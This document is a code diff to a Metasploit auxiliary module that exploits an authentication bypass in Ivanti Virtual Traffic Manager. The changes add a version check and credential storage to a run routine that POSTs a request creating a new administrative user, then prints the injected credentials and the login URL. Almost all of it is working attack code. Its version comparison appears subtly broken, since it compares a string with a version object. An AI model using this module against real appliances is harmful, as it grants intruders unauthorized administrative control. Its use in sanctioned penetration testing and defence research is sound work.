@@ -1,5 +1,6 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -7,7 +8,7 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Ivanti Virtual Traffic Manager Authentication Bypass',
         'Description' => %q{
-          This module exploits an access control issue in Ivanti Virtual Traffic Manager <= 22.7R2, by adding a new
+          This module exploits an access control issue in Ivanti Virtual Traffic Manager 22.7R1, by adding a new
           administrative user to the web interface of the application.
         },
         'Author' => [
@@ -15,11 +16,12 @@ class MetasploitModule < Msf::Auxiliary
           'ohnoisploited' # Discovery and PoC
         ],
         'References' => [
-          ['URL', 'https://packetstormsecurity.com/files/179906']
+          ['PACKETSTORM', '179906']
         ],
         'DisclosureDate' => '2024-08-05',
         'DefaultOptions' => {
-          'RPORT' => 9090
+          'RPORT' => 9090,
+          'SSL' => 'True'
         },
         'License' => MSF_LICENSE,
         'Notes' => {
@@ -37,6 +39,29 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def check
+    res = send_request_cgi(
+      {
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri, 'apps', 'zxtm', 'login.cgi')
+      }
+    )
+
+    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
+
+    body = res.body
+    version_regex = /StingrayVersion\.Set\(\s*'([^']+)'\s*,/
+    match = body.match(version_regex)
+    if match
+      version = match[1]
+      return Exploit::CheckCode::Appears("Version: #{version}") if version <= Rex::Version.new('22.7R1')
+    else
+      return Exploit::CheckCode::Safe
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
   def run
     res = send_request_cgi(
       'method' => 'POST',
@@ -48,7 +73,6 @@ class MetasploitModule < Msf::Auxiliary
         'newusername' => datastore['NEW_USERNAME'],
         'password1' => datastore['NEW_PASSWORD'],
         'password2' => datastore['NEW_PASSWORD']
-
       }
     )
 
@@ -56,8 +80,20 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    print_good("New admin user was successfully injected:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
-    print_good("Login at: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}workflow/jsp/logon.jsp")
-  end
+    html = res.get_html_document
+    title_tag = html.at_css('title')
 
+    if title_tag
+      title_text = title_tag.text.strip
+      if title_text == '2'
+        store_valid_credential(user: datastore['NEW_USERNAME'], private: datastore['NEW_PASSWORD'], proof: html)
+        print_good("New admin user was successfully added:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
+        print_good("Login at: https://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}apps/zxtm/login.cgi")
+      else
+        fail_with(Failure::UnexpectedReply, 'Unexpected string found inside the title tag: ' + title_text)
+      end
+    else
+      fail_with(Failure::UnexpectedReply, 'title tag not found.')
+    end
+  end
 end
